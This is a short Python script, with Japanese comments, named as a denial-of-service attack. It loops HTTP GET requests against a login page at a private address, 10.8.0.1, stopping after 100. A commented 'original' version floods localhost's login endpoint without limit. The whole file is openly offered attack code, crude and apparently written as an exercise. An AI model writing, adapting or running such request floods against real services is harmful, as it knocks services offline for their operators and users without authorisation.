import requests

class DOS_attack:
    def Da(self):
        count = 0
        while True:
            requests.get("http://10.8.0.1/login/")
            count = count + 1
            if count >= 100:
                print("100回だけ行ったよ")
                break

# DOS_attackのインスタンスを作成
# dos = DOS_attack()

# DOS_attackのメソッドを呼び出す
# dos.Da()


# 本来のコード
# import requests
# while True:
#     requests.get("http://localhost/login/")
